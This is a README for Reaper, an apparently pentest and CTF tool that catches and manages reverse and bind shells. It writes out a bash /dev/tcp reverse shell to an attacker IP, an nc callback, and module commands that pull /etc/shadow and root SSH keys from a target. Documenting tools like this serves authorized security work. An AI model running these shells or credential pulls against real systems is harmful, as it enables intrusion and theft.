# Reaper

![Python](https://img.shields.io/badge/python-3.9+-2f81f7?style=for-the-badge&logo=python&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-1f6feb?style=for-the-badge&logo=linux&logoColor=white)
![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/version-1.2.0-2f81f7?style=for-the-badge)

Reaper is a multi-session reverse and bind shell handler for pentesters and CTF players. You start it, it listens, and when a shell calls back it figures out what it is talking to, upgrades the shell to a real PTY, and hands it to you ready to use. Think of it as a comfortable home for all the shells you catch during an engagement, so you are not juggling a pile of raw netcat windows.

If you have used [Penelope](https://github.com/brightio/penelope), the idea will feel familiar. Reaper aims for the same "it just works when the shell lands" experience, with a small, readable codebase and a module system you can extend.

```
  ☠  #1  10.10.14.5:44321  →  :4444  [ linux ]  root@target
  ✓  Shell #1 auto-upgraded to PTY.

kali@reaper(1 session) ❯ go 1
```

---

## What changed in 1.2.0

This release is mostly about one thing: **the interactive shell now actually works when you type into it.**

- **Fixed the frozen-input bug.** A background watchdog thread was reading one
  byte off every session socket to check if it was still alive. While you were
  attached to a shell, that thread and the interactive reader were fighting over
  the same stream, so it stole characters out of the shell's output. The result
  was a shell that felt frozen, dropped keystrokes, or corrupted whatever you
  typed. The watchdog now peeks at the socket without consuming anything
  (`MSG_PEEK`), so every byte reaches your terminal. Typing works.
- **Window resizing no longer eats output.** Resizing your terminal during a
  session used to drain bytes from the socket. It now just forwards the new size.
- **One bad command cannot take the whole tool down.** Every command runs inside
  a guard, so a typo or an unexpected error prints a message and drops you back
  at the prompt instead of crashing Reaper.
- **New blue theme.** The whole interface moved from red/orange to a cool steel
  blue palette that stays readable on a dark terminal. Errors stay red on
  purpose, so they still stand out.
- **New commands:** `killall`, `name`, and `go` with no id (see below).


---

## Features

| Feature | What it does |
|---|---|
| Multi-session | Catch and manage as many shells as you want at once. List them, jump between them, background them. |
| Multi-listener | Listen on several ports at the same time (`-p 4444,5555,9001`). |
| Live port management | Add or drop listening ports while running. No restart. |
| Auto PTY upgrade | Linux shells get upgraded to a full PTY automatically the moment they land. |
| Windows support | PowerShell and CMD shells get upgraded through ConPtyShell for a real interactive experience. |
| Session logging | Every session is written to `~/.reaper/logs/` so you have a record of everything. |
| File upload and download | Push files to the target or pull files (and whole directories) back, over a side TCP channel. |
| HTTP file server | Serve a file or folder with `reaper -s ./tools` or `serve .` from inside the prompt. |
| Bind shell mode | Connect outward to a listening target with `reaper -c <host>`. |
| Payload generation | Ready-to-paste reverse shells for bash, sh, python, php, perl, ruby, nc, socat, and PowerShell. |
| Module system | Small, hot-reloadable modules. Write your own and drop them in. |
| Tab completion | Context aware. Completes commands, session ids, module names, interfaces, and ports. |
| Screenable mode | A hidden toggle that redacts IPs so you can share screenshots safely. |
| Clean signals | `Ctrl+Z` backgrounds a session. `Ctrl+C` goes to the remote process, not to Reaper. |

---

## Install

```bash
git clone https://github.com/z3r0s6/Reaper
cd Reaper
pipx install --editable .
```

That gives you a `reaper` command on your PATH. If you do not use pipx, a plain
`pip install --user .` works too.

Requirements: Python 3.9 or newer. Reaper runs from a Linux operator box (Kali,
Parrot, or any Linux). Targets can be Linux or Windows.

---

## Quick start

Open two terminals and try it against yourself first.

```bash
# Terminal 1: start Reaper on the default port 4444
reaper
```

```bash
# Terminal 2: pretend to be a target and call back
nc 127.0.0.1 4444
```

Back in Terminal 1 you will see a new session pop up. Attach to it:

```
kali@reaper(1 session) ❯ go 1
```

Type `exit` inside the shell or hit `Ctrl+Z` to come back to the Reaper prompt.

---

## Command-line usage

### Start a listener

```bash
reaper                      # listen on 0.0.0.0:4444
reaper -p 9001              # one custom port
reaper -p 4444,5555,9001    # several ports at once
reaper -i 10.10.14.5 -p 443 # bind to a specific address
```

### Connect to a bind shell

When the target is listening and you connect to it:

```bash
reaper -c 10.10.10.50 -p 4444
```

### Serve files over HTTP

```bash
reaper -s .                                  # serve the current folder on :8000
reaper -s /opt/tools/linpeas.sh --serve-port 9090
```

### Print payloads without starting a listener

```bash
reaper -a               # payloads for every interface
reaper -a tun0          # payloads for one interface
reaper -a tun0 -p 443   # tailor the port shown in the payloads
```

### Logging options

```bash
reaper -L                       # turn session logging off
reaper --log-dir /tmp/reaper    # write logs somewhere else
```

### Everything at a glance

```bash
reaper -h
```

---

## Working inside the prompt

Once Reaper is running you get an interactive prompt. Here is the full command set.

### Sessions

| Command | What it does |
|---|---|
| `ls` | List every session, with OS, source, and uptime. |
| `go [id]` | Attach to a session. With no id, attaches to the only live one. |
| `upgrade <id>` | Manually upgrade a shell to a PTY (Linux) or ConPtyShell (Windows). |
| `name <id> <label>` | Give a session a friendly label so `ls` is easier to read. |
| `kill <id>` | Close one session. |
| `killall` | Close every session (asks first). |
| `log <id>` | Print the log file path for a session. |

```
kali@reaper(2 sessions) ❯ ls

kali@reaper(2 sessions) ❯ name 1 web-box
  ✓  Session #1 labelled web-box.

kali@reaper(2 sessions) ❯ go 1        # jump in
kali@reaper(2 sessions) ❯ go          # or just 'go' if there is only one
```

### Payloads

Give it an interface name and it prints copy-paste reverse shells pointed back
at that interface:

```
kali@reaper(0 sessions) ❯ payloads tun0

════════════════════════════════════════════
  ☠  tun0  →  10.10.14.5:4444
────────────────────────────────────────────

  [01] bash
      bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"

  [02] python3
      python3 -c 'import os,pty,socket;...'
```

Run `payloads` with no interface to see which ones are available.

### Modules

```
kali@reaper ❯ modules                              # list what is loaded
kali@reaper ❯ run sysinfo 1                         # enumerate the target
kali@reaper ❯ run upload 1 ./linpeas.sh /tmp/lp.sh  # push a file
kali@reaper ❯ run download 1 /etc/passwd            # pull a file
kali@reaper ❯ run download_dir 1 /etc ./etc.tar.gz  # pull a whole folder
kali@reaper ❯ run linpeas 1                         # run linpeas in memory
kali@reaper ❯ run linpeas 1 -o ./linpeas-out.txt    # and save the output
kali@reaper ❯ reload                                # hot-reload modules after editing
```

### Listeners and ports

```
kali@reaper ❯ listeners        # show active listeners
kali@reaper ❯ addport 9001     # start listening on another port, live
  ✓  Now listening on port 9001.
kali@reaper ❯ rmport 9001      # stop listening on a port
  ✓  Stopped listening on port 9001.
```

### HTTP file server

```
kali@reaper ❯ serve .              # serve current dir on :8000
kali@reaper ❯ serve /opt/tools 8888
kali@reaper ❯ stopserve
```

### Everything else

```
kali@reaper ❯ clear    # clear the screen
kali@reaper ❯ help     # full help
kali@reaper ❯ exit     # close all sessions and quit cleanly
```

---

## Keys inside a session

| Key | Action |
|---|---|
| `Ctrl+Z` | Background the session and return to the Reaper prompt. |
| `Ctrl+C` | Send an interrupt to the remote process (not to Reaper). |

Backgrounding never kills the shell. It stays open and shows up in `ls`, ready
for you to `go` back into it later.

---

## Tab completion

The prompt knows what you are in the middle of typing:

| You are typing | Tab gives you |
|---|---|
| the first word | every command |
| `go `, `upgrade `, `kill `, `log ` | live session ids |
| `run ` | module names |
| `run <module> ` | live session ids |
| `payloads ` | your network interfaces |
| `rmport ` | ports you are currently listening on |

---

## How a session comes to life

When a shell connects, Reaper does the boring setup for you:

1. Sends a quiet probe and reads the reply to work out the OS and shell type.
2. Grabs `user@host` so the notification tells you who and where.
3. Upgrades the shell: a real PTY on Linux, ConPtyShell on Windows.
4. Tells you it is ready.

```
  ☠  #1  10.10.14.5:44321  →  :4444  [ linux ]  root@target
  ✓  Shell #1 auto-upgraded to PTY.
```

That `→ :4444` is the local port the shell landed on. When you are listening on
several ports for several targets, it is the fastest way to tell your shells
apart. Type `go 1` and you are in.

---

## File transfer, in detail

Transfers do not go over the interactive shell. Reaper spins up a short-lived
TCP channel on your box and tells the target to read from or write to it, so
large files move cleanly and your prompt stays usable.

```
# Upload: local file  ->  target
kali@reaper ❯ run upload 1 /home/kali/tools/linpeas.sh /tmp/linpeas.sh

# Download: target file  ->  local
kali@reaper ❯ run download 1 /etc/shadow
kali@reaper ❯ run download 1 /root/.ssh/id_rsa ./loot/id_rsa

# Download a whole directory as a tar.gz
kali@reaper ❯ run download_dir 1 /etc ./loot/etc.tar.gz
```

Upload verifies the size on the far end and warns you if it does not match.

---

## Session logs

Everything you see in a session is written to disk:

```
~/.reaper/logs/session_<id>_<ip>_<timestamp>.log
```

Find the exact path for a session:

```
kali@reaper ❯ log 1
  ·  Session #1 log: /home/kali/.reaper/logs/session_1_10.10.14.5_20260712_120000.log
```

Turn logging off with `reaper -L`, or point it elsewhere with `--log-dir`.

---

## Screenable mode

If you are recording a demo or sharing a screenshot, this hides every IP behind
`<REDACTED>`. It is a hidden toggle, not shown in help or completion:

```
kali@reaper ❯ _reaper_screenable_
  ·  Screenable mode ON
```

Run it again to turn it off.

---

## Writing your own module

A module is a small class. Drop the file in `src/reaper/modules/` and run
`reload`, no restart needed. Full guide in [MODULES.md](MODULES.md).

```python
from reaper.modules.blueprint import ReaperModule

class MyModule(ReaperModule):
    name        = "my_module"
    description = "Does something useful."
    category    = "Enumeration"
    platform    = ["linux"]          # or "any", or ["windows_ps"], etc.

    def run(self) -> None:
        result = self.exec("whoami")
        self.ok(f"Running as: {result.stdout.strip()}")
```

Then:

```
kali@reaper ❯ reload
kali@reaper ❯ run my_module 1
```

Inside a module you get helpers like `self.exec()` for command-and-collect,
`self.exec_stream()` for live output, upload and download plumbing, and the same
notification helpers Reaper uses (`self.ok`, `self.err`, `self.warn`).

---

## Project layout

```
Reaper/
├── README.md
├── MODULES.md
├── pyproject.toml
└── src/
    └── reaper/
        ├── main.py          # entry point and argument parsing
        ├── listener.py      # listener, sessions, the command loop, interaction
        ├── session.py       # Session model, logging, raw terminal handling
        ├── detect.py        # OS auto-detection
        ├── cli.py           # help text
        ├── server.py        # HTTP file server
        ├── models.py        # CommandResult, StreamLine
        ├── modules/
        │   ├── blueprint.py # ReaperModule base class
        │   ├── loader.py    # module loader with hot-reload
        │   ├── sysinfo.py   # system enumeration
        │   ├── upload.py    # file upload
        │   ├── download.py  # file and directory download
        │   └── linpeas.py   # LinPEAS in-memory runner
        └── utils/
            ├── ui.py        # colors, ASCII art, notifications, spinner, boxes
            ├── tcp.py       # one-shot TCP send/recv helpers
            └── payloads.py  # reverse shell payload generator
```
---

## Legal

Reaper is for authorized security testing, CTFs, and lab work only. Use it only
against systems you own or have explicit written permission to test. What you do
with it is on you.
